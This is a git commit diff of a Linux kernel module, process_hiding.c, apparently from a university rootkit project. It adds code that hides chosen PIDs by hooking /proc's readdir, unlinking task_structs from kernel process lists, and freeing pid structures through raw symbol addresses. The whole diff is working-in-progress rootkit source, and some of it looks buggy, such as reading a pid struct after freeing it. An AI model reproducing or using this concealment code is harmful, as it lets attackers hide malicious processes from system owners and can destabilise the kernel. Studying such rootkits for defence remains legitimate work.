192b5632c79786fa513587ceb6ebc1fca5f4056a
Nicolas Appel <appeln@in.tum.de>
2013-11-03 18:52:06 +0100

    zwischenstand

--- process_hiding.c
+++ process_hiding.c
@@ -2,6 +2,15 @@
 #include <linux/proc_fs.h>
 #include <linux/fs.h>
 #include <linux/namei.h>
+#include <linux/sched.h>
+#include <linux/pid.h>
+#include <linux/list.h>
+#include <linux/hashtable.h>
+#include <linux/rwlock.h>
+#include <linux/rwlock_types.h>
+#include <linux/types.h>
+
+#include "sysmap.h"
 #include "process_hiding.h"
 
 #define MAX_PIDC 255
@@ -22,7 +31,6 @@ MODULE_PARM_DESC(hide_pid, "Array of PIDs");
 struct inode * get_proc_inode(void);
 static int readdir_proc (struct file*, void*, filldir_t);
 int my_filldir_t (void *, const char *, int, loff_t, u64, unsigned);
-
 
 struct inode * get_proc_inode(void)
 {
@@ -50,13 +58,26 @@ int my_filldir_t (void * __buf, const char * name, int namelen, loff_t offset, u
 	return proc_fill_dir(__buf,name,namelen,offset,ino,d_type);
 }
 
-void hide_processes(){
+void traverse_processes(struct task_struct * task_param){
 	int i;
-	for(i=0; i< pid_argc; i++){
-		snprintf(pid_array[i], MAX_PID_LEN, "%d", hide_pid[i]);
-		printk(KERN_INFO "pid: %s\n", pid_array[i]);
-	}
-	
+	struct task_struct * p_task;
+	struct list_head * p,*n = 0;
+	list_for_each(p, &(task_param->children)){
+		p_task = list_entry(p, struct task_struct, sibling);
+		for(i = 0; i < pid_argc; i++){
+			if(p_task->pid == hide_pid[i]){
+				printk(KERN_INFO "Found process: %d\n", p_task->pid);
+				n = p;
+				p = p->prev;
+				list_del(n);
+			}
+		}
+		
+		traverse_processes(p_task);
+	}	
+}
+
+void hide_proc_tree(){
 	proc_inode = get_proc_inode();
 	if(proc_inode == NULL){
 		printk(KERN_INFO "Couldn't obtain proc inode\n");
@@ -68,6 +89,36 @@ void hide_processes(){
 		proc_inode->i_fop = &my_fops;
 		is_hidden = 1;
 	}
+}
+
+void hide_processes(){
+	int i,res;
+	struct task_struct * p_task;
+	struct list_head * p, *n;
+	struct pid * h_pid;
+
+	for(i=0; i< pid_argc; i++){
+		snprintf(pid_array[i], MAX_PID_LEN, "%d", hide_pid[i]);
+		printk(KERN_INFO "pid: %s\n", pid_array[i]);
+
+		h_pid = find_get_pid(hide_pid[i]);
+		write_lock_irq((rwlock_t*)tasklist_lock_D);		
+		((void (*)(struct pid *))free_pid_T)(h_pid);
+		p_task = get_pid_task(h_pid, PIDTYPE_PID);
+		write_unlock_irq((rwlock_t*)tasklist_lock_D);
+	}
+
+	/*	
+	printk(KERN_INFO "Travsering stuff\n");
+	
+	traverse_processes(&init_task);
+	for_each_process(p_task){
+		p = p_task->tasks.prev;
+		n = p_task->tasks.next;
+		p->next = n;
+		n->prev = p;
+		printk(KERN_INFO "%d\n",p_task->pid);
+	}*/
 } 
 
 void unhide_processes(void){
